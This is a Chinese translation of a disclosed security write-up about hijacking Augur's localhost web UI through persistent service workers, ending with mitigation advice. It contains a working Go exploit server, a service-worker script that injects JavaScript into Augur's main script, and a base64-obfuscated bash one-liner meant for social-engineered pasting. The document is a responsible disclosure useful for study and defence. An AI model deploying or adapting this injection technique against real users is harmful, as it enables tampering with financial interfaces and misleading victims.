# 如何通过休眠服务劫持Augur

阅读量 **138043**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-08-09 11:30:25

 **x**

##### 译文声明

本文是翻译文章，文章来源：medium.com

原文地址：<https://medium.com/@peter_szilagyi/augur-hijack-via-dormant-service-workers-bea254258f98>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01cc279a3f9f4a8915.jpg)

## 一、前言

这份漏洞报告已于3星期之前发送给Augur，现在经对方允许我将漏洞细节公开。虽然攻击过程本身有点复杂，在实际环境中难以实现，但的确是一种通用型攻击方法，可以适用于多个去中心化应用。

![](https://p5.ssl.qhimg.com/t01abd1709ec8d68ce9.png)

## 二、Augur简介

目前Augur的架构主要由3个独立的层所组成：

1、在最底层，Augur包含建立在以太坊（Ethereum）之上的一系列智能合约（smart
contract）。这层由全局区块链驱动，可以通过由用户或者可信远程实体操作的网关节点来访问。

2、在中间层，Augur包含一个中间服务层，使用（可信）以太坊作为数据源，根据合约日志构建数据库，为基于web的UI提供预先准备好的数据。

3、在最上层，Augur包含由可信Augur节点提供的web UI，用户可以通过 **本地浏览器**
访问`http://localhost:8080`地址来与web UI交互。

在本文中，我们假设以太坊网络、网关以及Augur网关都为可信单元，并且处于正常运行状态。本文攻击的是链条的最后一个环节，即用户端的浏览器，最终实现将任意代码注入Augur
UI中。

## 三、Service Worker简介

> Service
> Worker是独立于web页面，由浏览器在后台运行的一个脚本，可以提供不需要web页面或者用户交互的服务，其核心功能是拦截并处理网络请求。
>
> ~Google Developers

简单总结一下，Service
Worker是现在所有Web浏览器都支持的一种技术，允许网站注册以后台线程形式运行的任意JavaScript，其主要目的是允许脱机缓存，此时Service
Worker可以劫持网络请求并为其提供服务（包括任意更改网络请求）。当用户不具备互联网连接时，Service
Worker可以让JavaScript代码充当临时服务器提供服务。

如果大家想了解更多细节，可以参考[Google开发者页面](https://developers.google.com/web/fundamentals/primers/service-workers/)。从本文的角度来看，（除劫持网络请求这个核心功能以外）最有趣的地方在于Service Work的生命周期以及威胁模型：

1、站点可以在任意时间点安装Service Worker。这个 **Service Worker会一直处于有效执行状态，除非被显式取消注册为止**
。即使页面刷新、完全强制刷新甚至浏览器重启，Service Worker都会处于正常工作状态。Service
Worker并没有与伺服的特定内容绑定，即使面对全新的、不相关的内容，之前注册的Service Worker也会处于活跃状态。

2、不管从哪个角度来看，从设计方面讲Service
Worker天然就是一种MITM攻击，因此存在非常严格的限制策略，只能从HTTPS来运行（确保网站只能注册代码，劫持属于自己的内容），并且注册的源与运行的源必须完全匹配（最严格的同源策略）。然而，
**`localhost`并不受如此严格的限制策略影响**，这样开发者工作起来就比较轻松。

总结出这两点后，我相信大家心里面已经有点数了。

## 四、漏洞利用细节

本文介绍的攻击思路用到了两方面技术，一是滥用现代浏览器的Service
Worker安全策略，二是利用了Augur在浏览器中运行UI这种设计特点，将两者结合起来后，可以实现无缝劫持所有的Augur通信数据，同样也能将任意代码无缝注入Augur的UI：

1、Augur的UI运行在`http://localhost:8080`，从SSL角度来看并没有经过身份认证。我们无法证明来自不同会话的代码是否属于（或不属于）同一个（或不同的）应用；

2、浏览器会将`localhost`当成开发环境，因此允许站点在没有使用SSL认证的情况下安装并执行Service Worker；

3、Service
Worker在浏览器中处于休眠状态（没有缓存控制，无法预先检测），每次加载相同的源（`http://localhost:8080`）时就会执行。

###  投递载荷

为了劫持Augur，我们首先需要在`localhost:8080`安装一个Service
Worker。该任务至少需要我们在目标主机上运行一次Web服务器，并在用户浏览器加载Augur之前至少加载一次`localhost:8080`。

在分析这个操作的难度之前，我们先演示更加直观的一种方法，以便更好理解攻击过程。先来看看Go语言版本的完全自包含的一段漏洞利用示例代码：

    
    
    package main
    
    import (
        "fmt"
        "net/http"
    )
    
    func main() {
        // Start a web-server on port 8080, serving the demo HTML and JS injector
        http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
            fmt.Fprint(w, index)
        })
        http.HandleFunc("/pwner.js", func(w http.ResponseWriter, r *http.Request) {
            w.Header().Set("Content-Type", "text/javascript")
            fmt.Fprint(w, pwner)
        })
        http.ListenAndServe(":8080", nil)
    }
    
    var index = `
    <html>
    
    <script>
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('/pwner.js')
      .then(function(registration) {
        console.log('Registration successful, scope is:', registration.scope);
      })
      .catch(function(error) {
        console.log('Service worker registration failed, error:', error);
      });
    }
    </script>
    
    <img id='gopher'/>
    <script>
        setTimeout(function() {
            document.getElementById('gopher').src = 'https://gophercises.com/img/gophercises_jumping.gif';
        }, 1000)
    </script>
    </html>
    `
    
    var pwner = `
    // Inject ourselves as the base service worker for Augur
    self.addEventListener('install', function(event) {
      console.log('Service worker installing...');
      self.skipWaiting();
    });
    
    self.addEventListener('activate', function(event) {
      console.log('Service worker activating...');
        clients.claim();
    });
    
    // Hijack and HTTP requests, we're looking for script loads
    self.addEventListener('fetch', function(event) {
      console.log('Fetching:', event.request.url);
      if (event.request.url.startsWith("http://localhost:8080/main.")) {
        // Main Augur application is loading, inject our custom script into it
        event.respondWith(fetch(event.request.url)
        .then(function(response) {
          return response.text();
        })
        .then(function(text) {
          return new Response(text + 'nsetTimeout(function() { alert("You are Pwned!") }, 3000);');
        }));
      }
    });
    `
    

这段代码主要做了如下工作：

1、启动一个Go web服务器，提供两个URI服务地址，`/`用于索引，`pwner.js`用于Service Worker劫持；

2、`index.html`页面包含一小段脚本，该脚本将`/pwner.js`注册为Service Worker，同时还会显示一只跳跃的地鼠，增加趣味性；

3、`/pwner.js`这个Service
Worker是一段简单的脚本，会劫持所有的网络请求，为每个请求打印日志，如果碰到与`main.js`（Augur的代码）有关的请求，就会在末尾注入任意一些JavaScript代码。

我们可以使用`go run
exploit.go`命令运行上述代码（你也可以将这些代码保存为任意文件名），然后从浏览器中加载这个页面。浏览器会显示一只地鼠，没有其他信息。然而如果我们查看JavaScript控制台，应该能够看到如下几行内容：

    
    
    Registration successful, scope is: http://localhost:8080/
    pwner.js:4 Service worker installing…
    pwner.js:9 Service worker activating…
    pwner.js:15 Fetching: https://gophercises.com/img/gophercises_jumping.gif
    

此时我们可以停止运行Go攻击服务器，关闭浏览器。劫持脚本已经成功注入，可以拦截`localhost:8080`源上的任意内容。

###  执行载荷

随着时间的推移（我们可以耐心等待，不要着急），用户终于通过官方仓库以及/或者客户端下载并启动Augur。随后Augur
App会启动，从以太坊网络同步本地数据库。当同步完成后，用户按下“Open Augur App”按钮，从用户浏览器中的应用加载Augur UI界面。

此时我们先前创建的处于休眠状态的Service
Worker就会开始执行，劫持UI与后端服务之间的所有网络流量。这样我们就可以任意修改用户和服务之间的数据流，同样也可以将任意JavaScript代码注入UI中。

比如文章开头那张图中，我们注入了一段JavaScript警告代码，显示“You are Pwned!”信息。

## 五、影响范围

这个漏洞的影响范围其实非常广泛。既然已经完全控制UI与后端服务器之间的网络流量，也完全控制了UI展示的内容，攻击者现在可以显示任意的Augur市场、股份、统计数据等。

攻击者并没有直接控制用户的资金，无法直接让用户签名无效交易。然而，通过修改市场描述和统计数据，攻击者可以说服用户发起失败的投资（比如颠倒获胜条件），从而让用户损失惨重。攻击者可以进一步在劫持的市场上对赌，直接获取大量利益。

从技术角度来看，该漏洞之所以影响程度较大，是因为无需特权就能利用，只需运行一次，就能在用户系统中永远处于待命状态，并且使用的是完全合法的浏览器功能，因此没有任何漏洞检测软件能够捕获这种方法。

## 六、实际攻击

利用过程中最难的一点是如何在第一时间用于最终用户。如前文所述，浏览器会对Service
Worker强制启用同源安全策略，因此在用户系统上唯一能攻击Augur的方法就是让用户从`localhost:8080`加载一个恶意页面。

前面的Go代码的确是非常好的演示代码，但显然不适用于实际利用场景。我们需要更好的社会工程学方法，将利用载荷投递给用户系统。

###  Bash命令

现在攻击加密货币用户的一种常见方法就是让用户从各种网页或者聊天消息中复制代码然后粘贴到终端中。虽然这种方法听起来比较愚笨，但的确行之有效，如果攻击过程中不需要root访问权限那会更加有用。

如下这段bash命令只包含791个字符，但功能齐全，可以提供2个不同的网页，自动让用户浏览器加载这些网页并注册Service Worker。

    
    
    echo SFRUUC8xLjEgMjAwIE9LDQoNCjxzY3JpcHQ+bmF2aWdhdG9yLnNlcnZpY2VXb3JrZXIucmVnaXN0ZXIoJycpPC9zY3JpcHQ+ | base64 -d | nc -lN 8080 > /dev/null && echo SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVR5cGU6IHRleHQvamF2YXNjcmlwdA0KDQpzZWxmLmFkZEV2ZW50TGlzdGVuZXIoImluc3RhbGwiLGZ1bmN0aW9uKGV2ZW50KXtzZWxmLnNraXBXYWl0aW5nKCl9KTtzZWxmLmFkZEV2ZW50TGlzdGVuZXIoImZldGNoIixmdW5jdGlvbihldmVudCl7aWYoZXZlbnQucmVxdWVzdC51cmwuc3RhcnRzV2l0aCgiaHR0cDovL2xvY2FsaG9zdDo4MDgwL21haW4uIikpe2V2ZW50LnJlc3BvbmRXaXRoKGZldGNoKGV2ZW50LnJlcXVlc3QudXJsKS50aGVuKGZ1bmN0aW9uKHJlc3BvbnNlKXtyZXR1cm4gcmVzcG9uc2UudGV4dCgpfSkudGhlbihmdW5jdGlvbih0ZXh0KXtyZXR1cm4gbmV3IFJlc3BvbnNlKHRleHQrYApzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7YWxlcnQoIllvdSBhcmUgUHduZWQhIil9LDMwMDApYCl9KSl9fSkK | base64 -d | nc -lN 8080 > /dev/null & xdg-open http://localhost:8080
    

这段代码看上去人畜无害，攻击者可以轻松将其隐藏在功能正常的一大段脚本中。由于注入动作不需要立即执行，因此受漏洞影响的用户很难觉察到主机上存在一个等待运行的休眠载荷。

###  劫持8080服务

`localhost`上的`8080`端口通常是Web服务的标准端口。Web开发者也已经习惯了在上面运行所开发的代码。许多服务、监控工具等也喜欢在类似`8080`的端口上运行。这意味着在开发者主机上劫持`8080`端口很有可能会成功，因此该操作只需要在任何Web依赖中添加几行代码，运行一次后就可以永久删除，不会留下痕迹。

虽然开发者可能不愿意在主机上运行任意代码（但实话实说，我们都运行了GitHub上的这段脚本，具体原因不表），但这个漏洞非常烦人，因为它可以运行在完全沙盒化的环境中（用户的浏览器），因此没人会想到简单的一次页面加载会在系统上留下任意攻击代码。

## 七、建议

从本质上讲，用于`origin`冲突，通过用户浏览器从`localhost`运行Augur
UI貌似不是最好的决定。浏览器总是会将`localhost`当成一个特殊的对象，如果再遇上安全策略，可以想象到未来有很多漏洞能够源自于此。如果Augur在许多功能上都要依赖Electron，那么可以考虑捆绑整个浏览器一起发布，并且单独为Augur提供专用进程。这样就能阻止其他浏览器会话将恶意脚本泄露给新的浏览器。

在`8080`端口上运行也不是一个明智的选择，这与其他许多服务商有冲突，也与开发者的默认选择有冲突。在不常用的其他端口上提供服务应该不会对用户体验造成太大影响，但攻击这个端口会比攻击`8080`常用端口要困难得多。

原文链接：https://medium.com/@peter_szilagyi/augur-hijack-via-dormant-service-workers-bea254258f98

本文翻译自medium.com [原文链接](https://medium.com/@peter_szilagyi/augur-hijack-via-dormant-service-workers-bea254258f98)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **興趣使然的小胃** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/154120](/post/id/154120)

安全客 - 有思想的安全新媒体

本文转载自: [medium.com](https://medium.com/@peter_szilagyi/augur-hijack-via-dormant-service-workers-bea254258f98)

如若转载,请注明出处： <https://medium.com/@peter_szilagyi/augur-hijack-via-dormant-service-workers-bea254258f98>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)
  * [Augur](/tag/Augur)

 **+1** __0赞

 __收藏

![](https://p4.ssl.qhmsg.com/dm/200_200_100/t0104d1b8b4ca36e961.jpg) 興趣使然的小胃

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

